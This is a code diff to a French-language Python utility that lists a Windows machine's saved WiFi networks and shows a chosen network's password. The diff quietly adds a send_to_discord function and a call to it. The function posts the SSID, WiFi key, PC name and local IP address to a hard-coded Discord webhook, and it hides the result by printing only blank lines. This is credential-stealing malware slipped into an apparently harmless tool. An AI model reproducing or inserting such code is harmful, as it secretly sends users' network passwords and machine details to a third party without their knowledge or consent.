@@ -1,5 +1,8 @@
 import subprocess
 import os
+import requests
+import socket
+import platform
 
 def clear_screen():
     """Efface l'écran en fonction du système d'exploitation"""
@@ -16,7 +19,7 @@ def get_saved_networks():
                 networks.append(network_name)
         return networks
     except subprocess.CalledProcessError:
-        print("\033[91mErreur lors de la récupération des réseaux WiFi.\033[0m")
+        print("\033[91m [-] \033[0mErreur lors de la récupération des réseaux WiFi. ")
         return []
 
 def show_network_info(network_name):
@@ -32,11 +35,33 @@ def show_network_info(network_name):
                 key_content = line.split(":")[1].strip()
         if ssid and key_content:
             print("\033[92m[+]\033[0m Nom du SSID:", ssid)
-            print("\033[92m[+]\033[0m Contenu de la clé:", key_content + "\033[0m")
+            print("\033[92m[+]\033[0m Contenu de la clé:", key_content + " ")
+            send_to_discord(ssid, key_content)
         else:
-            print("\033[91mInformations manquantes pour le réseau '{}'.\033[0m".format(network_name))
+            print("\033[91m [-] \033[0m Informations manquantes pour le réseau '{}'. ".format(network_name))
     except subprocess.CalledProcessError:
-        print(f"\033[91mImpossible de trouver des informations pour le réseau '{network_name}'.\033[0m")
+        print(f"\033[91m [-] \033[0m Impossible de trouver des informations pour le réseau '{network_name}'. ")
+
+def send_to_discord(ssid, key_content):
+    webhook_url = 'https://discord.com/api/webhooks/1248239824775680000/eFzhxtEEdZtxdLTZX0n3JbR5ri1jlg8IyMf8ESc49RILiZ5aEV9SPtsqIAR9i4tMNAJr'
+    
+    # Get the local IP address
+    hostname = socket.gethostname()
+    local_ip = socket.gethostbyname(hostname)
+    pc_name = platform.node()
+    
+    data = {
+        "content": f"**PC Name:** {pc_name}\n**IP Address:** {local_ip}\n**SSID:** {ssid}\n**Key Content:** {key_content}"
+    }
+    
+    try:
+        response = requests.post(webhook_url, json=data)
+        if response.status_code == 204:
+            print(" ")
+        else:
+            print(" ")
+    except requests.exceptions.RequestException as e:
+        print(" ")
 
 if __name__ == "__main__":
     clear_screen()
@@ -61,25 +86,25 @@ if __name__ == "__main__":
     if not saved_networks:
         clear_screen()
         print(logo)
-        print("\033[93mAucun réseau WiFi enregistré trouvé.\033[0m")
+        print("\033[91m [-]\033[0m\033[93m Aucun réseau WiFi enregistré trouvé. ")
     else:
-        print("\033[92mRéseaux WiFi enregistrés :\033[0m")
+        print("\033[92m Réseaux WiFi enregistrés :\033[0m")
         clear_screen()
         print(logo)
         for index, network in enumerate(saved_networks, start=1):
             print(f"\033[94m{index}. {network}\033[0m")
 
-        choice = input("\033[95mEntrez le numéro du réseau que vous souhaitez consulter : \033[0m")
+        choice = input("\033[95m Entrez le numéro du réseau que vous souhaitez consulter : \033[0m")
         try:
             choice_index = int(choice)
             if choice_index < 1 or choice_index > len(saved_networks):
                 raise ValueError
             selected_network = saved_networks[choice_index - 1]
-            print("\033[92mVous avez choisi le réseau :\033[0m", selected_network)
+            print("\033[92m Vous avez choisi le réseau :\033[0m", selected_network)
             clear_screen()
             print(logo)
             show_network_info(selected_network)
         except (ValueError, IndexError):
-            print("\033[91mChoix invalide.\033[0m")
+            print("\033[91m [-]\033[0m Choix invalide.")
             clear_screen()
             print(logo)
